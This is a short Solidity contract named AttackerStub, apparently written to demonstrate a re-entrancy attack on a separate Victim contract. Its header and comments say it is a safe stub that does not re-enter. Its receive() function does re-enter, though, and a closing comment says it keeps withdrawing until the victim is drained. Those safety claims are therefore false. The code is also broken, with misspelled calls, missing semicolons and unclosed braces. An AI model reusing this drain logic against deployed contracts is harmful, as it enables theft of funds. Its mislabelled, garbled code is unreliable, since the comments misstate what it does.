// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./Victim.sol";

/// @notice Educational stub only. Do NOT deploy on public networks.
/// The fallback does NOT perform a re-entrancy call — it's a demo stub.
contract AttackerStub {
    Victim public victim;
    address public owner;

    constructor(address _victim) {
        victim = Victim(_victim);
        owner = msg.sender;
    }

    // Deposit into Victim and call withdraw once (for demo)
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Send ETH to fund attack deposit");

        // Deposit our funds into the victim contract
        victim.deposit{value: msg.value}();

        // Trigger withdraw once to show how external transfer arrives
        victim.withdrawAll();
    }

    // fallback/receive will be hit when Victim sends ETH
    // We DO NOT re-enter here — this is intentionally safe.
    receive() external payable {
        if (address(victim).balance > 1eth){
            victim.withdrawll()
    } else{
      payable(msg.sender).transfer(address(this).balance)
}
// If the contract Victim has more then 1  Eth then attackers contract fallback and withdrawal again, this loop continues until victim drained,then send all Eth to sender when victim has no Eth left